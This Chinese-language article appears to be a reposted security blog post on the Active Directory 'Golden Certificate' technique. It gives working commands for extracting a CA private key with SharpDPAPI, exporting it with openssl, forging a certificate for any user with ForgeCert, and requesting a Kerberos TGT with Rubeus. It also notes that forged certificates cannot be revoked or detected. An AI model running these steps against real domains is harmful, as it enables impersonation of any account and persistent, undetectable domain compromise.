> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bJ0h6dzKQm9QqxrZHHCUag)

漏洞分析
----

默认情况下， AD 启用基于证书的身份验证。

要使用证书进行身份验证， CA 必须向账号颁发一个包含允许域身份验证的 EKU OID 的证书（例如客户端身份验证）。

当 账号使用证书进行身份验证时， AD 在根 CA 和 NT Auth Certificates 验证证书链对象指定的 CA 证书。

Active Directory 企业 CA 与 AD 的身份验证系统挂钩，CA 根证书私钥用于签署新颁发的证书。如果我们窃取了这个私钥，我们是否能够伪造我们自己的证书，该证书可用于（无需智能卡）作为组织中的任何人向 Active Directory 进行身份验证？  

作者命名为黄金证书

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO79Dqdtr6X1J8Yc7A0r9eicqjE1N07aZHOuR8zdk6WWrAa94mJsC3gicw/640?wx_fmt=png)

漏洞利用
----

证书存在于 CA 服务器中，如果 TPM/HSM 不用于基于硬件的保护，那么其私钥受机器 DPAPI 保护。如果密钥不受硬件保护，Mimikatz 和 SharpDPAPI 可以从 CA 中提取 CA 证书和私钥：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOACedLiaYZY9WSibrEEeyMhb0MiaP3lpw3JxfDf4wqyQe6RsMSibAgJWH7w/640?wx_fmt=png)

设置密码就可以直接导出了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOtFVuTK6p1aEnIcHia5cmcC3icnFlepEuvAn111o1Z3EBicfjsIE4SZC9Q/640?wx_fmt=png)

我们也可以直接使用工具导出。例如 Mimikatz，SharpDPAPI.exe

这里我使用的是 SharpDPAPI.exe

```
https://github.com/GhostPack/SharpDPAPI
SharpDPAPI.exe certificates /machine
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOdOezPDs2GlJKfRPJBNa8W5Rcc8Wia1kRb9yvQQyCiajJRDvibpsKfh80g/640?wx_fmt=png)

使用 Open SSL 可以直接输出证书

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOTbPCV9hESsGjfFwdnibKnb0dPTesUyJLQ4Sicic3lTncqdrlNJibhTMxsw/640?wx_fmt=png)

```
openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced  Cryptographic Provider v1.0" -export -out ca.pfx
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO2J5HeUZLWIqbhgD9pT6n4LVyaxR1GjSDHznZWTiad3icmwfqMaF55uRA/640?wx_fmt=png)

对于包含 CA 证书和私钥的 CA.pfx 文件，伪造证书的一种方法是将其导入单独的脱机 CA，并使用`MimiKatz的crypto：：scauth`函数生成和签名证书。

或者，可以手动生成证书，以确保对每个字段的粒度控制，并消除建立单独系统的需要。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOark2P2OhZT7YXptkepkOVstD73u7GQeF2QcFZvadQ46Cv4pst2V4Xg/640?wx_fmt=png)

在另一台主机中导入证书

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO914mhwR2EIyicW0mVnyplUew8uA5GoklQg1OQDYXGQ5iamd5FBCVZUug/640?wx_fmt=png)

我们可以使用原作者分布的工具一键伪造证书。

```
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Password123!" --Subject "CN=User" --SubjectAltName "localadmin@theshire.local" --NewCertPath localadmin.pfx --NewCertPassword "NewPassword123!"
```

ForgeCert 的原理

```
https://people.eecs.berkeley.edu/~jonah/bc/org/bouncycastle/x509/X509V3CertificateGenerator.html
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdO9dAgDsq3oy4xcJiazgiaEAazcdqXIvVnGu5GVPOp2Cg1jKLyOXL37ibuA/640?wx_fmt=png)

伪造证书的过程可以在我们控制的主机中进行伪造。

伪造证书时指定的目标用户需要在 AD 中处于活动状态 / 启用状态，并且能够进行身份验证，因为身份验证交换仍将作为该用户进行。例如，试图伪造 krbtgt 的证书是行不通的。

这个伪造的证书将有效到指定的结束日期（这里为一年），并且只要根 CA 证书有效（一般来说证书的有效期从 5 年开始，但通常延长到 10 年以上）。这种滥用也不限于普通用户帐户也适用于机器帐户。

生成的证书可以与 Rubeus 一起使用来请求 TGT（和 / 或检索用户的 NTLM；）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBgS6pTSYkXwJrg7MzQJkdOTlkHibibsqE1LUWMWbLfia4ePgOowa3saa7ZjMLF2Yib5y1PtxZQHiaTMwg/640?wx_fmt=png)

由于我们没有经过正常的签发流程，这个伪造的证书是不能撤销的。在 ADCS 中也没办法发现这个伪造的证书。